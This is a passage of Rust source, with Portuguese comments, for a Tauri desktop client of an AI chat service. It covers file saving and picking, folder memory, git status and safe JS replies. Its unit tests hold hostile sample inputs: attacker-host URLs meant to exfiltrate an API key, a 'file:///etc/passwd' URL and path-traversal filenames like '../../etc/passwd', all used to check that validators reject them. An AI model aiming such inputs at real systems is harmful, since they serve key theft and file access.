/// caminho é `set_overlay_icon`, que precisa de uma IMAGEM renderizada (o número
/// desenhado num ícone), não de um inteiro. Fica de fora conscientemente: renderizar
/// dígito em `Image` a cada mudança de contagem é trabalho de outra ordem, e o
/// retorno é pequeno perto do resto do D8.
fn badge(window: &WebviewWindow, v: &serde_json::Value) {
    let n = v.get("count").and_then(|x| x.as_i64()).unwrap_or(0);

    // 0 REMOVE o badge (contrato do Tauri: `None` ou `0` limpa). Mandar `Some(0)`
    // deixaria um "0" pendurado no ícone em alguns ambientes.
    let count = if n > 0 { Some(n) } else { None };

    // Erro aqui é silencioso de propósito: badge é enfeite informativo, e um
    // ambiente que não suporta (Windows, alguns WMs de Linux) não é motivo para
    // poluir o log a cada 60 s.
    let _ = window.set_badge_count(count);
}

/// Teto do artefato salvo pela ponte (50 MB). A página é confiável (host
/// canônico), mas o base64 vem por `eval` de mensagem — um limite explícito
/// evita que uma resposta malformada tente materializar meio gigabyte na RAM.
const MAX_SAVE_BYTES: usize = 50 * 1024 * 1024;

/// `saveFile` — salva um artefato GERADO pelo modelo onde o usuário ESCOLHER.
///
/// A página manda bytes (base64) + nome sugerido; nunca URL. O `/api/v1/files/
/// {id}` do ShvIA é autenticado por sessão, e a sessão vive na WebView — o Rust
/// não a tem. Com os bytes vindo prontos, o lado nativo só abre o diálogo e
/// escreve, sem precisar saber nada de autenticação.
///
/// Cancelar NÃO é erro: volta `{saved:false}` e o web fica quieto.
fn save_file(window: &WebviewWindow, req: String, v: &serde_json::Value) {
    use base64::Engine;
    use tauri_plugin_dialog::DialogExt;

    let nome = sanitize_filename(v.get("name").and_then(|x| x.as_str()).unwrap_or(""));
    let bytes = match v
        .get("dataBase64")
        .and_then(|x| x.as_str())
        .and_then(|s| base64::engine::general_purpose::STANDARD.decode(s).ok())
    {
        Some(b) if !b.is_empty() && b.len() <= MAX_SAVE_BYTES => b,
        _ => {
            reply(window, &req, false, serde_json::json!({ "error": "conteudo invalido" }));
            return;
        }
    };

    let win = window.clone();
    let mut dialogo = window.app_handle().dialog().file().set_file_name(&nome);
    // Mesma dor do anexo: salvar dois artefatos seguidos obrigava a refazer o
    // caminho na segunda vez.
    if let Some(dir) = ultima_pasta(window, "salvar") {
        dialogo = dialogo.set_directory(dir);
    }
    dialogo.save_file(move |path| {
        let Some(path) = path else {
            reply(&win, &req, true, serde_json::json!({ "saved": false }));
            return;
        };
        let resultado = path
            .into_path()
            .map_err(|e| e.to_string())
            .and_then(|p| std::fs::write(&p, &bytes).map(|_| p).map_err(|e| e.to_string()));
        match resultado {
            Ok(p) => {
                if let Some(pai) = p.parent() {
                    grava_ultima_pasta(&win, "salvar", pai);
                }
                reply(
                    &win,
                    &req,
                    true,
                    serde_json::json!({ "saved": true, "path": p.to_string_lossy() }),
                )
            }
            Err(e) => reply(&win, &req, false, serde_json::json!({ "error": e })),
        }
    });
}

/// Nome de arquivo vindo da PÁGINA: só o basename, sem separador de diretório
/// nem `..`. O diálogo já obriga o usuário a escolher a pasta, mas o campo do
/// nome não pode carregar caminho — nem no macOS, onde "/" é separador e ":"
/// tem herança de path.
fn sanitize_filename(nome: &str) -> String {
    let base = nome
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or("")
        .trim()
        .trim_matches('.')
        .replace(':', "-");
    let limpo: String = base
        .chars()
        .filter(|c| !c.is_control() && !matches!(c, '<' | '>' | '"' | '|' | '?' | '*'))
        .take(120)
        .collect();

    if limpo.is_empty() {
        "arquivo".to_string()
    } else {
        limpo
    }
}

#[cfg(test)]
mod tests_url_servidor {
    use super::url_do_servidor;

    /// O caminho legítimo: o web manda `location.origin` da página do ShvIA.
    #[test]
    fn origens_do_servidor_passam() {
        assert!(url_do_servidor("https://ai.shvia.org"));
        assert!(url_do_servidor("https://ia.shvia.org"));
        assert!(url_do_servidor("https://ia.blue3.com.br"));
    }

    /// `url` viaja junto com SHVIA_API_KEY: um host de fora aqui é exfiltração da
    /// chave do usuário. Nada além do servidor entra, nem por sufixo, nem por
    /// esquema fraco, nem o ápex (que é a landing, em outro IP).
    #[test]
    fn qualquer_outra_coisa_e_rejeitada() {
        assert!(!url_do_servidor("https://coletor.atacante.tld"));
        assert!(!url_do_servidor("https://ai.shvia.org.atacante.tld"));
        assert!(!url_do_servidor("https://shvia.org"));
        assert!(!url_do_servidor("https://evil.shvia.org"));
        assert!(!url_do_servidor("http://ai.shvia.org")); // sem TLS
        assert!(!url_do_servidor("file:///etc/passwd"));
        assert!(!url_do_servidor("nao-e-url"));
        assert!(!url_do_servidor(""));
    }
}

#[cfg(test)]
mod tests {
    use super::sanitize_filename;

    /// O nome vem da PÁGINA. O diálogo escolhe a pasta; o campo do nome não pode
    /// reintroduzir caminho por cima dela.
    #[test]
    fn nome_de_arquivo_nunca_carrega_caminho() {
        assert_eq!(sanitize_filename("../../etc/passwd"), "passwd");
        assert_eq!(sanitize_filename("/tmp/imagem.png"), "imagem.png");
        assert_eq!(sanitize_filename(r"C:\Windows\x.png"), "x.png");
        // macOS: ":" tem herança de separador de path no Finder.
        assert_eq!(sanitize_filename("pasta:arquivo.png"), "pasta-arquivo.png");
    }

    #[test]
    fn nome_vazio_ou_so_pontos_vira_fallback() {
        assert_eq!(sanitize_filename(""), "arquivo");
        assert_eq!(sanitize_filename("   "), "arquivo");
        assert_eq!(sanitize_filename("..."), "arquivo");
        assert_eq!(sanitize_filename("/"), "arquivo");
    }

    #[test]
    fn nome_normal_passa_intacto() {
        assert_eq!(sanitize_filename("imagem-gerada-1.png"), "imagem-gerada-1.png");
        assert_eq!(sanitize_filename("shvia-1785032029.svg"), "shvia-1785032029.svg");
    }

    #[test]
    fn caracteres_de_controle_e_curinga_saem() {
        assert_eq!(sanitize_filename("a\nb*c?.png"), "abc.png");
        assert!(sanitize_filename(&"x".repeat(500)).len() <= 120);
    }
}

// ── última pasta usada nos diálogos ─────────────────────────────────────────
//
// O diálogo do SO não lembra onde você estava: cada abertura nasce nos
// favoritos/atalhos, e para anexar o arquivo vizinho do que você acabou de
// anexar era preciso refazer o caminho inteiro (queixa de 03/08/2026). Isso é
// estado do DISPOSITIVO, não do usuário nem do projeto — mora aqui, ao lado do
// `modo-code-bindings.json`, e não sobe para o servidor.
//
// Uma chave por PROPÓSITO ('arquivos', 'pasta', 'salvar'): a pasta de onde você
// anexa contexto raramente é a pasta onde você salva um artefato, e uma chave só
// faria os três se atrapalharem.
const MAX_PICK_BYTES: usize = 10 * 1024 * 1024; // = MAX_FOLDER_FILE_BYTES do web
const MAX_PICK_FILES: usize = 30;

fn ultimas_pastas_path(window: &WebviewWindow) -> Option<PathBuf> {
    let dir = window.app_handle().path().app_config_dir().ok()?;
    let _ = std::fs::create_dir_all(&dir);
    Some(dir.join("ultimas-pastas.json"))
}

fn ultima_pasta(window: &WebviewWindow, chave: &str) -> Option<PathBuf> {
    let map: serde_json::Map<String, serde_json::Value> = ultimas_pastas_path(window)
        .and_then(|p| std::fs::read_to_string(p).ok())
        .and_then(|s| serde_json::from_str(&s).ok())
        .unwrap_or_default();
    let p = PathBuf::from(map.get(chave)?.as_str()?);
    // A pasta pode ter sido removida/desmontada desde a última vez. Apontar o
    // diálogo para um caminho morto é pior que não apontar: alguns backends
    // abrem vazios em vez de cair no default.
    p.is_dir().then_some(p)
}

fn grava_ultima_pasta(window: &WebviewWindow, chave: &str, dir: &std::path::Path) {
    if !dir.is_dir() {
        return;
    }
    let mut map: serde_json::Map<String, serde_json::Value> = ultimas_pastas_path(window)
        .and_then(|p| std::fs::read_to_string(p).ok())
        .and_then(|s| serde_json::from_str(&s).ok())
        .unwrap_or_default();
    map.insert(chave.to_string(), serde_json::json!(dir.to_string_lossy()));
    if let (Some(p), Ok(s)) = (ultimas_pastas_path(window), serde_json::to_string_pretty(&map)) {
        let _ = std::fs::write(p, s);
    }
}

fn pick_folder(window: &WebviewWindow, req: String) {
    use tauri_plugin_dialog::DialogExt;
    let win = window.clone();
    let mut dialogo = window.app_handle().dialog().file();
    if let Some(dir) = ultima_pasta(window, "pasta") {
        dialogo = dialogo.set_directory(dir);
    }
    dialogo.pick_folder(move |path| {
        let escolhido = path.and_then(|p| p.into_path().ok());
        // Guarda o PAI: quem escolheu ~/x/TDAH quase sempre volta para escolher
        // outro projeto em ~/x, não para entrar de novo no TDAH.
        if let Some(pai) = escolhido.as_ref().and_then(|p| p.parent()) {
            grava_ultima_pasta(&win, "pasta", pai);
        }
        let data = serde_json::json!({
            "path": escolhido.map(|p| p.to_string_lossy().to_string()),
        });
        reply(&win, &req, true, data);
    });
}

/// Seletor de arquivos NATIVO para os anexos do chat (arquivos do projeto).
///
/// Existe porque o `<input type="file">` da WebView não deixa escolher a pasta
/// inicial — é decisão do navegador, e no WebKitGTK ela cai nos favoritos toda
/// vez. Aqui o diálogo é nosso, então abre onde você estava.
///
/// Devolve os BYTES em base64, não os caminhos: a página é quem tem a sessão
/// autenticada e faz o upload, e ela não enxerga o disco. Mesmo desenho do
/// `save_file`, na direção contrária.
///
/// Arquivo acima do teto do servidor (10 MB) sai em `skipped` em vez de derrubar
/// a seleção inteira — o resto do que foi escolhido continua valendo.
fn pick_files(window: &WebviewWindow, req: String) {
    use base64::Engine;
    use tauri_plugin_dialog::DialogExt;

    let win = window.clone();
    let mut dialogo = window.app_handle().dialog().file();
    if let Some(dir) = ultima_pasta(window, "arquivos") {
        dialogo = dialogo.set_directory(dir);
    }
    dialogo.pick_files(move |paths| {
        let Some(paths) = paths else {
            reply(&win, &req, true, serde_json::json!({ "files": [], "canceled": true }));
            return;
        };

        let mut arquivos = Vec::new();
        let mut skipped: Vec<String> = Vec::new();
        let mut pasta_lembrada = false;

        for fp in paths.into_iter().take(MAX_PICK_FILES) {
            let Ok(path) = fp.into_path() else { continue };
            let nome = path
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_default();
            if nome.is_empty() {
                continue;
            }
            // A pasta vem do PRIMEIRO arquivo que deu certo — é onde o usuário
            // estava quando confirmou.
            if !pasta_lembrada {
                if let Some(pai) = path.parent() {
                    grava_ultima_pasta(&win, "arquivos", pai);
                    pasta_lembrada = true;
                }
            }
            match std::fs::read(&path) {
                Ok(bytes) if bytes.len() > MAX_PICK_BYTES => {
                    skipped.push(format!("{nome}: acima de 10 MB"));
                }
                Ok(bytes) => arquivos.push(serde_json::json!({
                    "name": nome,
                    "size": bytes.len(),
                    "dataBase64": base64::engine::general_purpose::STANDARD.encode(&bytes),
                })),
                Err(e) => skipped.push(format!("{nome}: {e}")),
            }
        }

        reply(
            &win,
            &req,
            true,
            serde_json::json!({ "files": arquivos, "skipped": skipped }),
        );
    });
}

// ── vínculo projeto→pasta (config local do dispositivo) ─────────────────────

fn bindings_path(window: &WebviewWindow) -> Option<PathBuf> {
    let dir = window.app_handle().path().app_config_dir().ok()?;
    let _ = std::fs::create_dir_all(&dir);
    Some(dir.join("modo-code-bindings.json"))
}

fn load_bindings(window: &WebviewWindow) -> serde_json::Map<String, serde_json::Value> {
    bindings_path(window)
        .and_then(|p| std::fs::read_to_string(p).ok())
        .and_then(|s| serde_json::from_str(&s).ok())
        .unwrap_or_default()
}

fn set_binding(window: &WebviewWindow, v: &serde_json::Value) {
    let pid = v.get("projectId").and_then(|x| x.as_str()).unwrap_or_default();
    let path = v.get("path").and_then(|x| x.as_str()).unwrap_or_default();
    if pid.is_empty() {
        return;
    }
    let mut map = load_bindings(window);
    map.insert(pid.to_string(), serde_json::json!(path));
    if let (Some(p), Ok(s)) = (bindings_path(window), serde_json::to_string_pretty(&map)) {
        let _ = std::fs::write(p, s);
    }
}

// ── painel da pasta: git status + árvore (read-only, pelo app — F4) ─────────

fn git_status(path: &str) -> serde_json::Value {
    if path.is_empty() {
        return serde_json::json!({ "repo": false });
    }
    match Command::new("git").args(["-C", path, "status", "--porcelain=v1", "-b"]).output() {
        Ok(o) if o.status.success() => parse_git_status(&String::from_utf8_lossy(&o.stdout)),
        _ => serde_json::json!({ "repo": false }), // não é repo git
    }
}

fn parse_git_status(text: &str) -> serde_json::Value {
    let mut branch = String::new();
    let mut files = Vec::new();
    for line in text.lines() {
        if let Some(rest) = line.strip_prefix("## ") {
            branch = rest.split("...").next().unwrap_or("").split(' ').next().unwrap_or("").to_string();
        } else if line.len() > 3 {
            files.push(serde_json::json!({ "status": line[..2].trim(), "path": &line[3..] }));
        }
    }
    serde_json::json!({ "repo": true, "branch": branch, "files": files })
}

/// Um nível da árvore (lazy-load ao expandir). Ignora pastas de build/deps.
fn list_tree(path: &str) -> serde_json::Value {
    const IGNORE: &[&str] = &[".git", "node_modules", "vendor", "target", "dist", "build", ".svn"];
    let mut entries: Vec<(bool, String, String)> = Vec::new();
    if let Ok(rd) = std::fs::read_dir(path) {
        for e in rd.flatten() {
            let name = e.file_name().to_string_lossy().into_owned();
            if IGNORE.contains(&name.as_str()) {
                continue;
            }
            let is_dir = e.file_type().map(|t| t.is_dir()).unwrap_or(false);
            entries.push((is_dir, name, e.path().to_string_lossy().into_owned()));
        }
    }
    // pastas primeiro, depois alfabético.
    entries.sort_by(|a, b| b.0.cmp(&a.0).then_with(|| a.1.to_lowercase().cmp(&b.1.to_lowercase())));
    let arr: Vec<serde_json::Value> = entries
        .into_iter()
        .map(|(d, name, p)| serde_json::json!({ "name": name, "path": p, "isDir": d }))
        .collect();
    serde_json::json!({ "entries": arr })
}

// ── helpers ─────────────────────────────────────────────────────────────────

/// Responde uma requisição da página (`_reply`), no main thread.
pub(crate) fn reply(window: &WebviewWindow, req: &str, ok: bool, data: serde_json::Value) {
    // `data` vai como JSON.parse(<string>) — mesmo caminho seguro do stdout — pra
    // que js_str neutralize aspas e U+2028/2029 (um path/erro com esses chars
    // quebraria o eval se `data` fosse interpolado cru).
    let js = format!(
        "window.__shviaCode&&window.__shviaCode._reply({}, {}, JSON.parse({}))",
        js_str(req),
        ok,
        js_str(&data.to_string())
    );
    let w = window.clone();
    let app = window.app_handle().clone();
    let _ = app.run_on_main_thread(move || {
        let _ = w.eval(&js);
    });
}

/// String → literal JS seguro (escapa aspas/controle; U+2028/2029 são válidos em
/// JSON mas quebram string literal JS).
fn js_str(s: &str) -> String {
    serde_json::to_string(s)
        .unwrap_or_else(|_| "\"\"".into())
        .replace('\u{2028}', "\\u2028")
        .replace('\u{2029}', "\\u2029")
}
